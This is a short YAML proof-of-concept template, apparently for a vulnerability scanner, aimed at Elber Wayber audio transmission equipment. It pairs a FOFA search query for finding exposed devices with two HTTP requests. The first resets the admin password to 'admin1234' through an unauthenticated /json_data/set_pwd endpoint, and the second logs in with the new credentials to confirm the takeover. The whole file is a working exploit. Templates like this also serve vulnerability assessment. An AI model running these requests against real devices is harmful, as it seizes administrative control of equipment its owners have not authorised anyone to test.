id: poc-yaml-elber-wayber-analog-digital-audio-password-reset
info:
  name: Elber Wayber 模拟数字音频 密码重置漏洞
  severity: high
  tags:
  - 访问控制错误
  finger: Elber Wayber 模拟数字音频
  fofa: title="Elber Satellite Equipment" || body="www.elber.it"
requests:
- method: GET
  path: /json_data/set_pwd?lev=2&pass=admin1234
  expression: status_code == 200 && body == "Apply successfully"
- method: GET
  path: /json_data/login?username=admin&password=admin1234
  expression: status_code == 200 && contains(body,"\"name\" \u003a \t\t\"admin\"")
variables: {}
transport: http
